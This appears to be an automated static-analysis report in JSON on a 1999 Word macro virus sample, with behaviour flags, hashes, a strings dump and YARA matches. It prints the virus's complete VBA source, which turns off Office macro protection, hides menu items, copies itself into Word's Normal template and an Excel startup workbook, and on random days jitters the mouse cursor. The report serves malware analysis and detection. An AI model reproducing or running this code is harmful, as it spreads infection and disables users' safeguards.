{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"Cross\""
        ],
        "behavior": {
            "ActiveWorkbook.SaveAs": "May save the current workbook",
            "AutoOpen": "Runs when the Word document is opened",
            "Auto_Open": "Runs when the Excel Workbook is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "Lib": "May run code from a DLL",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n\n\n\nPublic Const ModulName = \"Cross\"\n\nPublic Declare Function SetCursorPos Lib \"user32\"     (ByVal x As Long, ByVal y As Long) As Long\n\nPublic Declare Function GetCursorPos Lib \"user32\"     (lpPoint As Maus) As Long\n\nPublic Declare Sub Sleep Lib \"kernel32\"     (ByVal dwMilliseconds As Long)\n\nPrivate Type Maus\n       Xpos As Long\n       Ypos As Long\nEnd Type\n\n\nSub AutoOpen()\nOn Error Resume Next\n\nOptions.VirusProtection = False\nOptions.SaveNormalPrompt = False\n\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel\", \"Options6\") = \"\"\nSystem.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office\\8.0\\New User Settings\\Excel\\Microsoft Excel\", \"Options6\") = \"\"\n\nCommandBars(\"View\").Controls(6).Enabled = False\nCommandBars(\"Format\").Controls(12).Enabled = False\nCommandBars(\"Tools\").Controls(12).Enabled = False\nCommandBars(\"Tools\").Controls(13).Enabled = False\nCommandBars(\"Tools\").Controls(14).Enabled = False\n\nApplication.DisplayAlerts = wdAlertsNone\n\nApplication.VBE.ActiveVBProject.VBComponents(ModulName).Export \"c:\\cross.sys\"\n\nSet Normal_ = NormalTemplate.VBProject.VBComponents\nSet Active_ = ActiveDocument.VBProject.VBComponents\n\nFor i = 1 To Normal_.Count\n    If Normal_(i).Name = ModulName Then NormalIns = True\nNext i\n\nFor j = 1 To Active_.Count\n    If Active_(j).Name = ModulName Then ActiveIns = True\nNext j\n\nIf NormalIns = False Then\n    Normal_.Import \"c:\\cross.sys\"\nEnd If\n\nIf ActiveIns = False Then\n    Active_.Import \"c:\\cross.sys\"\n    ActiveDocument.SaveAs ActiveDocument.FullName\nEnd If\n\nWith Application.FileSearch\n    .LookIn = Application.Path\n    .FileName = \"Workbook_.xls\"\n    .SearchSubFolders = True\n    .Execute\nIf .FoundFiles.Count <> 0 Then ExcelInstalled = True\nEnd With\n    \nIf ExcelInstalled = False Then\n\n    Set Excelx = CreateObject(\"excel.application\")\n    Excelx.Visible = False\n    \n    Excelx.CommandBars(\"Tools\").Controls(10).Enabled = False\n    Excelx.CommandBars(\"Tools\").Controls(12).Enabled = False\n    Excelx.CommandBars(\"View\").Controls(3).Enabled = False\n    Excelx.CommandBars(\"Window\").Controls(3).Enabled = False\n    Excelx.CommandBars(\"Window\").Controls(4).Enabled = False\n\n    Book = Excelx.Application.StartupPath & \"\\Workbook_.xls\"\n    \n    Set Workbookx = Excelx.Workbooks.Add\n    \n    Workbookx.VBProject.VBComponents.Import \"c:\\cross.sys\"\n    Excelx.ActiveWindow.Visible = False\n    Workbookx.SaveAs Book\n\n    Excelx.Quit\n\nEnd If\nIf Day(Now()) = Int(Rnd * 31) Then mEarthquake\nEnd Sub\n\nSub Auto_Open()\nApplication.OnSheetActivate = \"Exceler\"\nEnd Sub\n\nSub Exceler()\nOn Error Resume Next\nApplication.VBE.ActiveVBProject.VBComponents(ModulName).Export \"c:\\cross.sys\"\n\nWith Application\n.DisplayAlerts = False\n.ScreenUpdating = False\n\n.CommandBars(\"Tools\").Controls(10).Enabled = False\n.CommandBars(\"Tools\").Controls(12).Enabled = False\n.CommandBars(\"View\").Controls(3).Enabled = False\n.CommandBars(\"Window\").Controls(3).Enabled = False\n.CommandBars(\"Window\").Controls(4).Enabled = False\nEnd With\n\nSet Active_ = ActiveWorkbook.VBProject.VBComponents\nBook = Application.StartupPath & \"\\Workbook_.xls\"\n\nIf UCase(Dir(Book)) <> \"WORKBOOK_.XLS\" Then\n    Workbooks.Add.SaveAs FileName:=Book, AddToMru:=False\n    Workbooks(\"Workbook_.xls\").VBProject.VBComponents.Import \"c:\\cross.sys\"\n    ActiveWindow.Visible = False\n    Workbooks(\"Workbook_.xls\").Save\nEnd If\n\nFor i = 1 To Active_.Count\n    If Active_(i).Name = ModulName Then Installed = True\nNext\n\nIf Installed = False Then\n    Active_.Import \"c:\\cross.sys\"\n    ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName, AddToMru:=False\nEnd If\n\nSet Wordx = CreateObject(\"word.application\")\n\n    Wordx.Visible = False\n    Set WordTemp = Wordx.NormalTemplate.VBProject.VBComponents\n    \n    For j = 1 To WordTemp.Count\n        If WordTemp(j).Name = ModulName Then WordIns = True\n    Next\n   \n    If WordIns = False Then\n    \n        WordTemp.Import \"c:\\cross.sys\"\n \n        Wordx.Options.VirusProtection = False\n        Wordx.Options.SaveNormalPrompt = False\n    \n        Wordx.CommandBars(\"View\").Controls(6).Enabled = False\n        Wordx.CommandBars(\"Format\").Controls(12).Enabled = False\n        Wordx.CommandBars(\"Tools\").Controls(12).Enabled = False\n        Wordx.CommandBars(\"Tools\").Controls(13).Enabled = False\n        Wordx.CommandBars(\"Tools\").Controls(14).Enabled = False\n\n        Wordx.System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel\", \"Options6\") = \"\"\n        Wordx.System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office\\8.0\\New User Settings\\Excel\\Microsoft Excel\", \"Options6\") = \"\"\n      \n    End If\n\nWordx.Quit\nIf Day(Now()) = Int(Rnd * 31) Then mEarthquake\nEnd Sub\n\nSub mEarthquake()\n\nDim posMaus As Maus\nDim newX As Long, newY As Long\nApplication.Caption = \"Office97Macro.Crossworkx...it's time for an earthquake!\"\n\nDo\n    GetCursorPos posMaus\n                 \n     newX = Rnd(2)\n     If newX = 0 Then newX = -5 Else newX = 5\n     \n     newY = Rnd(2)\n     If newY = 0 Then newY = -5 Else newY = 5\n           \n     SetCursorPos posMaus.Xpos + newX, posMaus.Ypos + newY\n     Sleep 2\n\n     DoEvents\nLoop\n\nEnd Sub\n"
    },
    "filename": "VirusShare_1c0bd146af6358ad929f3e4b2bd14f8d",
    "filesize": 41472,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Unbekannt, Template: Normal, Last Saved By: Unbekannt, Revision Number: 5, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sat Jun 12 20:53:00 1999, Last Saved Time/Date: Sat Jun  5 12:38:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "1c0bd146af6358ad929f3e4b2bd14f8d",
        "sha1": "cb19fae15718c410a95861df49372bbeb3df322e",
        "sha256": "8438a9e5e41d5fa06e57e1c1668b6d9194e4685d83af13ace2353694aa2bd43d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            ". A!",
            "ue6f+6",
            "Unbekannt",
            "Normal",
            "Unbekannt",
            "Microsoft Word 8.0",
            "Titel",
            "_PID_GUID",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "Sub Document_Close() ",
            "Sub Document_Open()",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "Project",
            "rstd",
            "ole>",
            "\\G{00C",
            "Tools",
            "Tools",
            "c:\\cross.sys ",
            "c:\\cross.sys ",
            "c:\\cross.sys ",
            "Workbook_.xls",
            "excel.application",
            "Tools",
            "Tools",
            "View ",
            "Window ",
            "Window ",
            "\\Workbook_.xls",
            "c:\\cross.sys ",
            "Exceler",
            "c:\\cross.sys ",
            "Tools",
            "Tools",
            "View7",
            "Window7",
            "Window7",
            "\\Workbook_.xls",
            "WORKBOOK_.XLS",
            "c:\\cross.sys",
            "Workbook_.xls",
            "Workbook_.xls",
            "c:\\cross.sys ",
            "word.application$",
            "c:\\cross.sys ",
            "View ",
            "Format ",
            "Tools",
            "Tools",
            "Tools",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel",
            "Options6 ",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office\\8.0\\New User Settings\\Excel\\Microsoft Excel",
            "Options6 ",
            "Mouse Pos: ",
            "SetCursorPos",
            "GetCursorPos",
            "Sleep",
            "Sleep",
            "GetCursorPos",
            "Cross",
            "Exce",
            "are\\ ",
            "Cross",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel",
            "Options6 ",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office\\8.0\\New User Settings\\Excel\\Microsoft Excel",
            "Options6 ",
            "View$",
            "Format$",
            "Office97Macro.Crossworkx...it's time for an earthquake!",
            "Attribut",
            "e VB_Nam",
            "e = \"Cro",
            "lic Const Modul",
            "Declare",
            " Functio",
            "n SetCur",
            "sorPos L",
            "ib \"user",
            "32\" _",
            "(ByVal ",
            "ong,* ",
            "flpPoint",
            "LMaus",
            "Sub Slee",
            "Xkernel",
            "YdwMillisecondsRB)",
            "Sriva",
            "Tpype ",
            "wX.p",
            "EnLd ",
            "utoOpen(",
            ".On Erro@r ResuNHext",
            ".VirusPr",
            "= Fa lse",
            "veNormalq",
            "ystem.P/",
            " fileSng",
            "(\"\", \"HK",
            "EY_CURRE",
            "NT_USER\\ Softw|\\M",
            "\\Off",
            "ice\\8.0\\Excel",
            "D#6\")",
            "LOCAL_MACHINE",
            "`New U",
            "ingsh#",
            "ommandBa",
            "rs(\"View",
            "\").@trol",
            "s(6).EnabledGO",
            "pp~aJ.Di",
            "splayAleHrts ",
            "VBE.BA@OveVB",
            "HjQP.VB#p",
            "xport \"c:\\aG0s.syPet",
            " cT_",
            "Docdnt",
            "@5 i",
            "1 To",
            " =unj",
            "(i).C$Then",
            "Ibn#Tru\"r i",
            "(.Imr-If",
            "With \tNF earch",
            ".L`ookIn(",
            "Workb",
            "_.xlI",
            ".S\tFol",
            ").Fo(und",
            "s4 <8> 0\"*",
            ",talc",
            "C$re",
            "Obe(\"e.aGp\" !",
            "/0p~",
            "eWWindoW",
            "onc[N/q",
            "I&Sta",
            "rtup& & \"\\%  3",
            "s.Add\u03d3",
            "IneR6Qx",
            "Qui\"",
            "@0Day(Now",
            "()yInt(RA@* 31)0mEP",
            "hquakNq",
            "OnSheetB",
            "_s`(?g.E?g3gMH",
            "~o6.Scre enUpdqngW8 ",
            "_\u03c6Imu._2]",
            "84S]P",
            "ytive",
            ")O/B/",
            "WUCase(Dir(",
            "`[\"WORKBO",
            "OK_.XLS\"7+7R9.1Ud:=\t!",
            ";ToMru:=hV",
            "f~)/",
            "<!d9",
            "_#l3",
            "\u0112m6\"",
            "DWd?tword-t",
            "#h.#",
            "_eQe(",
            "rdx.Opti",
            "ons.VirusProtec",
            " = False",
            "SaveNormal",
            "fmpt",
            "jCommand",
            "Bars(\"Vi",
            "ew\").Con",
            "trols(6)",
            ".Enabled",
            "ut\t@d12+ATo",
            ";K 3",
            " Syst",
            "em.Priva",
            "tefileS",
            "tring(\"\"",
            ", \"HKEY_",
            "CURRENT_",
            "USER\\Sof",
            "tware\\Mi",
            "cros",
            "fice\\8.0@\\Excel",
            "6\")d\"",
            "\"3\"LOCAL_MACHINE\\\"",
            "New User Sett3s&",
            "(End If",
            "CQuit",
            "If Day@(Now()A4I",
            "nt(R@",
            "1) Then ",
            "mEarthquakA",
            " posMaus As ",
            "newXA",
            "Lon(g, @",
            "Applica",
            "8.CaB",
            "Wc97$Ma",
            "orkx...i",
            "t's time",
            " for an Ze(!d",
            "oC=G",
            "etCursorPos",
            "-5 EA",
            ".X - +\"",
            "leep 2",
            "DoEven",
            "Loop",
            "lpPoint]",
            "Punkt5[",
            "Sleep",
            "dwMilliseconds\u0165",
            "kernel32_",
            "xAchse",
            "yAchse",
            "diesc",
            "posPunktG",
            "RndR",
            "newXu\t",
            "newYr\t",
            "Xpos)",
            "Ypos",
            "posMaus",
            "MausI.",
            "_B_var_newXn",
            "_B_var_newYn",
            "Command1_ClickV",
            "POINTAPI",
            "Caption",
            "Now%",
            "_B_var_IfP",
            "020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F4A95",
            "061-160C",
            "-11D3-B5",
            "4445535",
            "3.TWD",
            "#Microso(ft ",
            " Library",
            "?4AF91",
            "7C3-1464",
            "?ABD",
            "403393BF25?P\\VBE\\@",
            "EX@.E",
            "Ma*l",
            "pNDLap",
            "j +\t,C",
            "Of(fic",
            "G{2DF8D0",
            "4C-5BFA-",
            "101B-BDER5",
            "=PROGRAM",
            "<ICROSO",
            "FT OFFIC",
            "MSO970.DLL",
            "b\" 8",
            ".0Rb",
            "sDocumenDt",
            "@0TD",
            "h@5s",
            "DHcD",
            ";J\"B",
            "*\\CNormalrU",
            "DEST",
            "DEST",
            "ThisDocument",
            "Cross",
            "Project",
            "C:\\PROGRAMME\\GEMEINSAME DATEIEN\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\StdOle2.tlb",
            "stdole",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "737590be3",
            "537590bd9",
            "Public",
            "Then",
            "Wordk",
            "Win16~",
            "Win32",
            "Projekt1A",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Modul1",
            "Cross",
            "ModulName",
            "AutoOpen*",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "Systema",
            "PrivateProfileString[",
            "CommandBars",
            "ControlsK",
            "Enabled\u06ea",
            "Application*",
            "DisplayAlerts",
            "wdAlertsNone",
            "ActiveVBProject[`",
            "VBComponents",
            "Export",
            "Normal_",
            "NormalTemplateq",
            "VBProjectOh",
            "Active_.3",
            "ActiveDocument\\",
            "Count0v",
            "NormalIns%",
            "ActiveIns",
            "Importi",
            "SaveAsf;",
            "FullName\u041e",
            "FileSearchD",
            "LookInP",
            "Path2",
            "FileNamej",
            "SearchSubFolders",
            "ExecuteY",
            "FoundFiles",
            "ExcelInstalledL",
            "Excelxo",
            "CreateObject",
            "Visible",
            "Book",
            "StartupPathi",
            "WorkbookxG",
            "WorkbooksB",
            "Addr",
            "ActiveWindow+",
            "Quit9",
            "Auto_OpenV ",
            "OnSheetActivaten",
            "Exceler{",
            "ScreenUpdating!",
            "ActiveWorkbook",
            "UCase5",
            "AddToMruf",
            "Save",
            "Installed",
            "Wordx8",
            "WordTemp",
            "WordIns ",
            "Documentj",
            "Document_Open",
            "oldhostRU",
            "MacroContainer>",
            "CodeModule",
            "newhost",
            "Skip",
            "vcode",
            "vbCr",
            "Lines",
            "CountOfLines!\\",
            "AddFromString",
            "MouseDisco",
            "_B_var_Sub",
            "MouseEarthquakeq",
            "mEarthquake?",
            "SetCursorPosM",
            "user32*",
            "GetCursorPosL",
            "Document",
            "SetCursorPos",
            "user32",
            "SetCursorPos",
            "GetCursorPos",
            "GetCursorPos",
            "Sleep",
            "kernel32",
            "Sleep",
            "AutoOpen",
            "Auto_Open",
            "Exceler",
            "mEarthquake",
            "VBA332.DLL",
            "lpPoint",
            "dwMillisecondsd",
            "ThisDocument",
            "Cross",
            "ID=\"{49CE64E8-2111-11D3-ABD0-00403393BF25}\"",
            "Document=ThisDocument/&H00000000",
            "Module=Cross",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"696BCB09CF09CF09CF09CF\"",
            "DPB=\"D2D0701BD81CD81CD8\"",
            "GC=\"3B3999B203B303B3FC\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=154, 154, 601, 489, ",
            "Cross=44, 44, 491, 379, Z",
            "Microsoft Word-Dokument",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "8.CaB": "Cabinet",
            "C:\\PROGRAMME\\GEMEINSAME DATEIEN\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSWORD8.OLB": "Autogen",
            "MSO970.DLL": "Library",
            "VBA332.DLL": "Library",
            "Workbook_.xls": "Excel",
            "\\Workbook_.xls": "Excel"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.304745",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
